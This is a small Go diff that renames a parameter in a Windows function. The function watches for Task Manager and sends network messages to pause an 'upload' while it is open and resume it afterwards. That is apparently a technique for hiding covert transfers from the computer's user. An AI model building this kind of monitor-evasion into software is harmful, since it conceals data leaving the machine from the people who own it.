@@ -10,7 +10,7 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func StartTaskManagerDetector(factory net.Conn) {
+func StartTaskManagerDetector(conn net.Conn) {
 	if TaskmgrRunning.Load() {
 		return
 	}
@@ -20,10 +20,10 @@ func StartTaskManagerDetector(factory net.Conn) {
 			if running && !TaskmgrRunning.Load() {
 				TaskmgrRunning.Store(true)
 				// log.Println("[goupload] 检测到任务管理器 → 暂停上传")
-				factory.Write([]byte("NOTIFY\n" + "检测到任务管理器 → 暂停上传" + "\n"))
+				conn.Write([]byte("NOTIFY\n" + "检测到任务管理器 → 暂停上传" + "\n"))
 			} else if !running && TaskmgrRunning.Load() {
 				TaskmgrRunning.Store(false)
-				factory.Write([]byte("NOTIFY\n" + "任务管理器关闭 → 恢复上传" + "\n"))
+				conn.Write([]byte("NOTIFY\n" + "任务管理器关闭 → 恢复上传" + "\n"))
 			}
 			time.Sleep(2 * time.Second)
 		}
